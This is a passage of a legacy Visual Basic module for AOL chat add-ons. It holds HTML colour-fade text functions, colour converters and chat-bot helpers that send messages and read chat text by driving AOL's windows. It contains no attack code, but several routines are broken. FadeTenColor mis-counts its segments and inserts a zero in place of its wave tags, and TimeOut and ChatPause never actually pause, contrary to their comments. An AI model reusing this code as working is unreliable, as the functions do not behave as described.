    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Mid(TheText, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(TheText, frthlen%)
    
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / TextLen% * i) + B1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / TextLen% * i) + B2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    TextLen% = Len(part3$)
    For i = 1 To TextLen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B4 - B3) / TextLen% * i) + B3, ((G4 - G3) / TextLen% * i) + G3, ((R4 - R3) / TextLen% * i) + R3)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part4
    TextLen% = Len(part4$)
    For i = 1 To TextLen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B5 - B4) / TextLen% * i) + B4, ((G5 - G4) / TextLen% * i) + G4, ((R5 - R4) / TextLen% * i) + R4)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFiveColor = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function
Function FadeTenColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, R10%, G10%, B10%, TheText$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    Dim TheHTML As Long
    WaveState = 0
    
    TextLen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Mid(TheText, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(TheText, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(TheText, ninelen%)
    
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / TextLen% * i) + B1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / TextLen% * i) + B2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part3
    TextLen% = Len(part3$)
    For i = 1 To TextLen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B4 - B3) / TextLen% * i) + B3, ((G4 - G3) / TextLen% * i) + G3, ((R4 - R3) / TextLen% * i) + R3)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    TextLen% = Len(part4$)
    For i = 1 To TextLen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B5 - B4) / TextLen% * i) + B4, ((G5 - G4) / TextLen% * i) + G4, ((R5 - R4) / TextLen% * i) + R4)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    TextLen% = Len(part5$)
    For i = 1 To TextLen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B6 - B5) / TextLen% * i) + B5, ((G6 - G5) / TextLen% * i) + G5, ((R6 - R5) / TextLen% * i) + R5)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    TextLen% = Len(part6$)
    For i = 1 To TextLen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B7 - B6) / TextLen% * i) + B6, ((G7 - G6) / TextLen% * i) + G6, ((R7 - R6) / TextLen% * i) + R6)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        faded6$ = faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part7
    TextLen% = Len(part7$)
    For i = 1 To TextLen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B8 - B7) / TextLen% * i) + B7, ((G8 - G7) / TextLen% * i) + G7, ((R8 - R7) / TextLen% * i) + R7)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        faded7$ = faded7$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part8
    TextLen% = Len(part8$)
    For i = 1 To TextLen%
        TextDone$ = Left(part8$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B9 - B8) / TextLen% * i) + B8, ((G9 - G8) / TextLen% * i) + G8, ((R9 - R8) / TextLen% * i) + R8)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        faded8$ = faded8$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part9
    TextLen% = Len(part9$)
    For i = 1 To TextLen%
        TextDone$ = Left(part9$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B10 - B9) / TextLen% * i) + B9, ((G10 - G9) / TextLen% * i) + G9, ((R10 - R9) / TextLen% * i) + R9)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        faded9$ = faded9$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    FadeTenColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + faded6$ + faded7$ + faded8$ + faded9$
End Function


Function InverseColor(OldColor)
'by monk-e-god
dacolor$ = RGBtoHEX(OldColor)
redx% = Val("&H" + Right(dacolor$, 2))
greenx% = Val("&H" + Mid(dacolor$, 3, 2))
bluex% = Val("&H" + Left(dacolor$, 2))
newred% = 255 - redx%
newgreen% = 255 - greenx%
newblue% = 255 - bluex%
InverseColor = RGB(newred%, newgreen%, newblue%)

End Function

Function MultiFade(NumColors%, TheColors(), TheText$, WavY As Boolean)
'by monk-e-god
Dim WaveState%
Dim WaveHTML$
WaveState = 0

If NumColors < 1 Then
MsgBox "Error: Attempting to fade less than one color."
MultiFade = TheText
Exit Function
End If

If NumColors = 1 Then
blah$ = RGBtoHEX(TheColors(1))
redpart% = Val("&H" + Right(blah$, 2))
greenpart% = Val("&H" + Mid(blah$, 3, 2))
bluepart% = Val("&H" + Left(blah$, 2))
blah2 = RGB(bluepart%, greenpart%, redpart%)
blah3$ = RGBtoHEX(blah2)

MultiFade = "<Font Color=#" + blah3$ + ">" + TheText
Exit Function
End If

Dim RedList%()
Dim GreenList%()
Dim BlueList%()
Dim DaColors$()
Dim DaLens%()
Dim DaParts$()
Dim faded$()

ReDim RedList%(NumColors)
ReDim GreenList%(NumColors)
ReDim BlueList%(NumColors)
ReDim DaColors$(NumColors)
ReDim DaLens%(NumColors - 1)
ReDim DaParts$(NumColors - 1)
ReDim faded$(NumColors - 1)

For q% = 1 To NumColors
DaColors(q%) = RGBtoHEX(TheColors(q%))
Next q%

For W% = 1 To NumColors
RedList(W%) = Val("&H" + Right(DaColors(W%), 2))
GreenList(W%) = Val("&H" + Mid(DaColors(W%), 3, 2))
BlueList(W%) = Val("&H" + Left(DaColors(W%), 2))
Next W%

TextLen% = Len(TheText)
Do: DoEvents
For f% = 1 To (NumColors - 1)
DaLens(f%) = DaLens(f%) + 1: TextLen% = TextLen% - 1
If TextLen% < 1 Then Exit For
Next f%
Loop Until TextLen% < 1
    
DaParts(1) = Left(TheText, DaLens(1))
DaParts(NumColors - 1) = Right(TheText, DaLens(NumColors - 1))
    
dastart% = DaLens(1) + 1

If NumColors > 2 Then
For E% = 2 To NumColors - 2
DaParts(E%) = Mid(TheText, dastart%, DaLens(E%))
dastart% = dastart% + DaLens(E%)
Next E%
End If

For r% = 1 To (NumColors - 1)
TextLen% = Len(DaParts(r%))
For i = 1 To TextLen%
    TextDone$ = Left(DaParts(r%), i)
    LastChr$ = Right(TextDone$, 1)
    ColorX = RGB(((BlueList(r% + 1) - BlueList(r%)) / TextLen% * i) + BlueList(r%), ((GreenList%(r% + 1) - GreenList(r%)) / TextLen% * i) + GreenList(r%), ((RedList(r% + 1) - RedList(r%)) / TextLen% * i) + RedList(r%))
    colorx2 = RGBtoHEX(ColorX)
        
    If WavY = True Then
    WaveState = WaveState + 1
    If WaveState > 4 Then WaveState = 1
    If WaveState = 1 Then WaveHTML = "<sup>"
    If WaveState = 2 Then WaveHTML = "</sup>"
    If WaveState = 3 Then WaveHTML = "<sub>"
    If WaveState = 4 Then WaveHTML = "</sub>"
    Else
    WaveHTML = ""
    End If
        
    faded(r%) = faded(r%) + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
Next i
Next r%

For qwe% = 1 To (NumColors - 1)
FadedTxtX$ = FadedTxtX$ + faded(qwe%)
Next qwe%

MultiFade = FadedTxtX$

End Function

Function Replacer(TheStr As String, This As String, WithThis As String)
'by monk-e-god
Dim STRwo13s As String
STRwo13s = TheStr
Do While InStr(1, STRwo13s, This)
DoEvents
thepos% = InStr(1, STRwo13s, This)
STRwo13s = Left(STRwo13s, (thepos% - 1)) + WithThis + Right(STRwo13s, Len(STRwo13s) - (thepos% + Len(This) - 1))
Loop

Replacer = STRwo13s
End Function
Function RGBtoHEX(RGB)
'heh, I didnt make this one...
    a$ = Hex(RGB)
    b% = Len(a$)
    If b% = 5 Then a$ = "0" & a$
    If b% = 4 Then a$ = "00" & a$
    If b% = 3 Then a$ = "000" & a$
    If b% = 2 Then a$ = "0000" & a$
    If b% = 1 Then a$ = "00000" & a$
    RGBtoHEX = a$
End Function

Function Rich2HTML(RichTxt As Control, StartPos%, EndPos%)
'by monk-e-god
Dim Bolded As Boolean
Dim Undered As Boolean
Dim Striked As Boolean
Dim Italiced As Boolean
Dim LastCRL As Long
Dim LastFont As String
Dim HTMLString As String

For posi% = StartPos To EndPos
RichTxt.SelStart = posi%
RichTxt.SelLength = 1

If Bolded <> RichTxt.SelBold Or posi% = StartPos Then
If RichTxt.SelBold = True Then
HTMLString = HTMLString + "<b>"
Bolded = True
Else
HTMLString = HTMLString + "</b>"
Bolded = False
End If
End If

If Undered <> RichTxt.SelUnderline Or posi% = StartPos Then
If RichTxt.SelUnderline = True Then
HTMLString = HTMLString + "<u>"
Undered = True
Else
HTMLString = HTMLString + "</u>"
Undered = False
End If
End If

If Striked <> RichTxt.SelStrikeThru Or posi% = StartPos Then
If RichTxt.SelStrikeThru = True Then
HTMLString = HTMLString + "<s>"
Striked = True
Else
HTMLString = HTMLString + "</s>"
Striked = False
End If
End If

If Italiced <> RichTxt.SelItalic Or posi% = StartPos Then
If RichTxt.SelItalic = True Then
HTMLString = HTMLString + "<i>"
Italiced = True
Else
HTMLString = HTMLString + "</i>"
Italiced = False
End If
End If

If LastCRL <> RichTxt.SelColor Or posi% = StartPos Then
ColorX = RGB(GetRGB(RichTxt.SelColor).blue, GetRGB(RichTxt.SelColor).Green, GetRGB(RichTxt.SelColor).red)
colorhex = RGBtoHEX(ColorX)
HTMLString = HTMLString + "<Font Color=#" & colorhex & ">"
LastCRL = RichTxt.SelColor
End If

If LastFont <> RichTxt.SelFontName Then
HTMLString = HTMLString + "<font face=" + Chr(34) + RichTxt.SelFontName + Chr(34) + ">"
LastFont = RichTxt.SelFontName
End If

HTMLString = HTMLString + RichTxt.SelText
Next posi%

Rich2HTML = HTMLString

End Function

Function HTMLtoRGB(TheHTML$)
'by monk-e-god
'converts HTML such as 0000FF to an
'RGB value like &HFF0000 so you can
'use it in the FadeByColor functions
Dim redx As String
Dim greenx As String
Dim rgbhex As String
Dim bluex As String
If Left(TheHTML$, 1) = "#" Then TheHTML$ = Right(TheHTML$, 6)

redx$ = Left(TheHTML$, 2)
greenx$ = Mid(TheHTML$, 3, 2)
bluex$ = Right(TheHTML$, 2)
rgbhex$ = "&H00" + bluex$ + greenx$ + redx$ + "&"
HTMLtoRGB = Val(rgbhex$)
End Function
Function FadeFourColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, TheText$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    seclen% = seclen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
    Loop Until TextLen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Right(TheText, thrdlen%)
    
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / TextLen% * i) + B1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / TextLen% * i) + B2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    TextLen% = Len(part3$)
    For i = 1 To TextLen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B4 - B3) / TextLen% * i) + B3, ((G4 - G3) / TextLen% * i) + G3, ((R4 - R3) / TextLen% * i) + R3)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFourColor = Faded1$ + Faded2$ + Faded3$
End Function

Function FadeThreeColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, TheText$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    fstlen% = (Int(TextLen%) / 2)
    part1$ = Left(TheText, fstlen%)
    part2$ = Right(TheText, TextLen% - fstlen%)
    'part1
    TextLen% = Len(part1$)
    For i = 1 To TextLen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / TextLen% * i) + B1, ((G2 - G1) / TextLen% * i) + G1, ((R2 - R1) / TextLen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    TextLen% = Len(part2$)
    For i = 1 To TextLen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / TextLen% * i) + B2, ((G3 - G2) / TextLen% * i) + G2, ((R3 - R2) / TextLen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    
    FadeThreeColor = Faded1$ + Faded2$
End Function

Function FadeTwoColor(R1%, G1%, B1%, R2%, G2%, B2%, TheText$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    Dim TextLen As String
    Dim faded As String
    WaveState = 0
    
    TextLen$ = Len(TheText)
    For i = 1 To TextLen$
        TextDone$ = Left(TheText, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / TextLen$ * i) + B1, ((G2 - G1) / TextLen$ * i) + G1, ((R2 - R1) / TextLen$ * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        faded$ = faded$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    FadeTwoColor = faded$
End Function
'************END by MONK-E-God**********

Function ChatAutoUpChat(per As String)
'call autoupchat(1)
'that will minimize on 1% when upwindow is shown
    Dim UpWindow As Long
    UpWindow& = FindWindow("_AOL_MODAL", "File Transfer - " + per$ + "%") 'u can change it to any percent
    If UpWindow& = 0 Then
        Exit Function
    End If
    Call ShowWindow(UpWindow&, SW_HIDE)
    Call ShowWindow(UpWindow&, SW_MINIMIZE)
'you can change the bottom to what timer you want and take out the '   s
'Form1.Timer1.Enabled = False
'Form1.Timer2.Enabled = True
End Function

Sub ChatUnUpChat()
'Call ChatUnUpChat
    Dim UpWindow As Long
    UpWindow& = FindWindow("_AOL_MODAL", vbNullString)
    If UpWindow& = 0 Then
    Exit Sub
    End If
    Call ShowWindow(UpWindow&, SW_HIDE)
    Call ShowWindow(UpWindow&, SW_RESTORE)
End Sub
Sub ChatUpChatStatus()
Dim lchild2 As Long, lchild1 As Long, lchild3 As Long
Dim upstat1 As String
Dim upstat As String
Dim uppercent As String
Dim lparent
lchild1 = FindWindowEx(lparent, 0, "_AOL_Modal", vbNullString)
uppercent$ = GetText(lchild1&)
'ChatSend (uppercent$)

lchild2 = FindWindowEx(lchild1, 0, "_AOL_Static", vbNullString)
upstat$ = GetText(lchild2&)
'ChatSend (upstat$)

lchild3 = FindWindowEx(lchild1, lchild2, "_AOL_Static", vbNullString)
upstat1$ = GetText(lchild3&)
'ChatSend (upstat1$)
'Call ChatSend ("(uppercent)+(upstat)+(upstat1)")
'sommin' like dat
End Sub

'****from [[[MY]]] botz3k.bas ********


Public Sub ChatSend1(Chat As String)
'FOR BOTZ ONLY>>>DONT USE THIS>USE CHATSEND
'This sub is for sending text into the chatroom, it was taken
'from the dos32.bas, so i know it works fine..
'ex: ChatSend ("text to send to chat here")
    Dim Room As Long, AORich As Long, AORich2 As Long
    Room& = FindChatRoom&
    AORich& = FindWindowEx(Room, 0&, "RICHCNTL", vbNullString)
    AORich2& = FindWindowEx(Room, AORich, "RICHCNTL", vbNullString)
    Call SendMessageByString(AORich2, WM_SETTEXT, 0&, Chat$)
    Call SendMessageLong(AORich2, WM_CHAR, ENTER_KEY, 0&)
End Sub
Public Sub TimeOut(Duration)
'dont use this, use the function Pause
'this sub pauses in the chatsend so that when your sending
'text you can pause for a certain amount of time so that you
'dont get logged off aol for scrolling...
'ex: timeout 1
'that would pause between text for a half a second(0.5 used alot)
Dim Starttime As Long
Starttime = Timer
    Do While Timer - Starttime > Duration
      DoEvents
    Loop
End Sub
Sub ChatPause(Duration)
'dont use this, just use the function Pause
Dim Starttime As Long
  Starttime = Timer
    Do While Timer - Starttime > Duration
      DoEvents
    Loop
End Sub
Public Function ChatLineMsg(chatline As String) As String
'Seperates ChatMsg from ChatSn
'Example:
'Dim SayWhat As String, ChatText As String
'ChatText = Text1.Text
'SayWhat$ = ChatLineMsg(ChatText$)

If InStr(chatline, Chr(9)) = 0 Then
ChatLineMsg = ""
Exit Function
End If
ChatLineMsg = Right(chatline, Len(chatline) - InStr(chatline, Chr(9)))
End Function
Public Function ChatLineSN(ChtLine As String) As String
'Seperates ChatMsg from ChatSn
'Example:
'Dim SN As String, ChatText As String
'ChatText = Text1.Text
'SN$ = ChatLineMsg(ChatText$)
If InStr(ChtLine, ":") = 0 Then
ChatLineSN = ""
Exit Function
End If
ChatLineSN = Left(ChtLine, InStr(ChtLine, ":") - 1)
End Function
Function SNFromLastChatLine()
Dim SN
Dim Z
Dim ChatTrim As String
Dim ChatText As String
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 17)
For Z = 1 To 17
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function
Function GetChatText()
Dim ChatText
Dim AORich As Long
Dim Room As Long
Room& = FindChatRoom
AORich& = FindChildByClass(Room&, "RICHCNTL")
ChatText = GetText(AORich&)
GetChatText = ChatText
End Function


Function LastChatLineWithSN()

Dim LastLine
Dim lastlen
Dim TheChatText As String
